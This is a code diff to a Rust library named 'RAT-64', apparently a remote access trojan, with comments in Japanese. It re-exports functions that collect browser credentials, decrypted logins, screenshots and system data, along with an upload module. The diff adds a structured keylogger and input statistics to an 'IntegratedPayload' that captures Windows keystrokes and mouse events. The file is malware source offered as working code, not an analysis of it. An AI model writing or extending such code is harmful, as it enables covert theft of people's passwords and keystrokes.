@@ -1,4 +1,4 @@
-// RAT-64 Library - 整理されたモジュール構造版
+// RAT-64 Library - 統合されたモジュール構造（整理済み）
 use serde::{Serialize, Deserialize};
 
 // カスタムエラー型の定義
@@ -42,11 +42,11 @@ pub type RatResult<T> = Result<T, RatError>;
 // 整理されたモジュールシステム
 pub mod core;        // 基本設定とコア機能
 pub mod collectors;  // データ収集機能
-pub mod network;     // ネットワーク通信機能
+pub mod network;     // ネットワーク通信機能  
 pub mod utils;       // ユーティリティ機能
 pub mod services;    // バックグラウンドサービス機能
 
-// 整理済み: modulesディレクトリは統合
+
 
 // 公開API（新しいモジュール構造に対応）
 pub use core::{Config, load_config_or_default};
@@ -57,7 +57,11 @@ pub use collectors::{
     AuthData, collect_auth_data_with_config,
     ScreenshotData, collect_screenshots,
     get_profile_path, get_default_profile,
-    JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin
+    JsonCredentials, SqliteCredentials, NssCredentials, DecryptedLogin,
+    // Enhanced keylogger functions
+    collect_input_events_for, collect_input_events_structured,
+    save_session_to_file, load_session_from_file, get_daily_logs,
+    get_statistics, InputEvent, InputStatistics
 };
 pub use utils::{encrypt_data_with_key, generate_key_pair};
 pub use network::{UploadResult, UploadError, Uploader, upload_data_file, upload_multiple};
@@ -87,7 +91,9 @@ pub struct IntegratedPayload {
     pub system_info: SystemInfo,
     pub auth_data: AuthData,
     pub screenshot_data: Option<ScreenshotData>,
-    pub input_events: Option<Vec<String>>,    // 入力イベントログ
+    pub input_events: Option<Vec<String>>,    // 従来の入力イベントログ（互換性用）
+    pub input_events_structured: Option<Vec<InputEvent>>, // 新しい構造化入力データ
+    pub input_statistics: Option<InputStatistics>, // 入力統計情報
     pub timestamp: String,
     pub session_id: String,
     pub encryption_key: Option<String>,  // Base64エンコードされた暗号化キー
@@ -106,18 +112,23 @@ impl IntegratedPayload {
         };
         // 入力イベント（Windowsのみ、3秒サンプリング）
         #[cfg(windows)]
-        let input_events = {
-            use crate::collectors::key_mouse_logger::collect_input_events_for;
-            tokio::task::spawn_blocking(|| collect_input_events_for(3000)).await.ok()
+        let (input_events, input_events_structured, input_statistics) = {
+            use crate::collectors::key_mouse_logger::{collect_input_events_for, collect_input_events_structured, get_statistics};
+            let structured = tokio::task::spawn_blocking(|| collect_input_events_structured(3000)).await.ok();
+            let legacy = tokio::task::spawn_blocking(|| collect_input_events_for(3000)).await.ok();
+            let stats = get_statistics();
+            (legacy, structured, stats)
         };
         #[cfg(not(windows))]
-        let input_events = None;
+        let (input_events, input_events_structured, input_statistics) = (None, None, None);
 
         Ok(IntegratedPayload {
             system_info,
             auth_data,
             screenshot_data,
             input_events,
+            input_events_structured,
+            input_statistics,
             timestamp: chrono::Utc::now().to_rfc3339(),
             session_id: uuid::Uuid::new_v4().to_string(),
             encryption_key: None,    // 後で設定
